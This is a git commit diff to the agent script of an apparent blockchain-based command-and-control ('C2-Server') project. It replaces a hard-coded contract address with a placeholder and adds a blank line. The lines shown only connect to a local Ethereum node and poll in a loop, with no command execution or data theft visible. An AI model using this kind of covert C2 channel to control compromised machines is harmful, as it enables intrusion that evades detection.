c07e585acfff87d187a7641ab19a4815f2227ee0
guea14012 <gor.kua145@gmail.com>
2026-03-07 14:21:24 +0000

    Update agent.py

--- C2-Server/agent/agent.py
+++ C2-Server/agent/agent.py
@@ -17,7 +17,7 @@ w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
 with open("abi.json") as f:
     abi = json.load(f)
 
-contract_address = "0x0C12Fd4606cb8485b1a3EC363d2E432D570F9d69"
+contract_address = "PUT_CONTRACT_ADDRESS"
 
 contract = w3.eth.contract(address=contract_address, abi=abi)
 
@@ -58,5 +58,6 @@ while True:
 
     except Exception as e:
         pass
+
 
     time.sleep(5)
